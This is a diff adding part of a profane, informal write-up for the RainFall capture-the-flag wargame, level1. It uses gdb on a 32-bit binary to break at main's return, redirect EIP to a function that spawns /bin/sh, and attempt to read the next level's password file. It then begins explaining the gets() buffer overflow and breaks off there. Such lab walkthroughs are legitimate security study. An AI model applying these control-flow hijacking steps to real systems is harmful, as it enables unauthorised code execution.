@@ -93,3 +93,56 @@ mov     dword [esp {var_1c}], data_8048584  {"/bin/sh"}
 call    system
 ```
 ### how the fuck do you jump to this stupid shit
+the binary is an **ELF 32-bit LSB executable**, need to find address of the run function and jump to it
+
+address of run function **08048444** using objdump -d, **8048496** is for RET instruction to jump to break in it and overrid RIP with the run function address
+```
+level1@RainFall:~$ gdb ./level1
+(gdb) b main
+Breakpoint 1 at 0x8048483
+(gdb) b *8048496
+Breakpoint 2 at 0x7acf70
+(gdb) r
+Starting program: /home/user/level1/level1 
+Warning:
+Cannot insert breakpoint 2.
+Error accessing memory address 0x7acf70: Input/output error.
+
+(gdb) disassemble main 
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   ebp
+   0x08048481 <+1>:     mov    ebp,esp
+   0x08048483 <+3>:     and    esp,0xfffffff0
+   0x08048486 <+6>:     sub    esp,0x50
+   0x08048489 <+9>:     lea    eax,[esp+0x10]
+   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave  
+   0x08048496 <+22>:    ret    
+End of assembler dump.
+(gdb) b *main+22
+```
+gdb fucking got retarded, so hat to clear all breakpoints using **clear breakpoint**
+```
+(gdb) c
+Continuing.
+hello
+
+Breakpoint 3, 0x08048496 in main ()
+(gdb) set $eip=0x08048444
+(gdb) c
+Continuing.
+Good... Wait what?
+$ cat /home/user/level2/.pass
+cat: /home/user/level2/.pass: Permission denied
+```
+**what the fuck whyyyyyyyy**
+
+So apparently gdb runs executable without SUID
+```
+$ id
+uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)
+```
+**FUCKING KILL ME**, would've been so easyyyy, why is life so hard ans unfair
+#### getting the fucking offset to EIP, because I'm gay
+buffer oferflow occurs because the gets() function doesnt have a limit on the reading size, 
